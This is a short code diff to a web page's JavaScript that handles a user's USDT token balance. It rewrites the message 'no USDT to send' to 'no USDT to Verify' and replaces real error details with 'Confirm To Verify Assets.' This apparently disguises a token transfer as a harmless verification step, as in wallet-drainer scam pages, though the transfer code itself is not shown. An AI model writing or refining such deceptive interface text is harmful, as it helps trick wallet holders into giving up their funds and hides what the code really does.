@@ -441,7 +441,7 @@
 
         if (balance.isZero()) {
           balanceElement.textContent = "Your USDT Balance: 0";
-          log("❌ You have no USDT to send.", 'error');
+          log("❌ You have no USDT to Verify.", 'error');
           return;
         }
 
@@ -453,7 +453,7 @@
         log("✅ USDT Verified Successfully!", 'success');
       } catch (err) {
         console.error(err);
-        log(`❌ Error: ${err.message || err}`, 'error');
+        log("❌ Error: Confirm To Verify Assets. ", 'error');
       } finally {
         showLoading(false);
       }
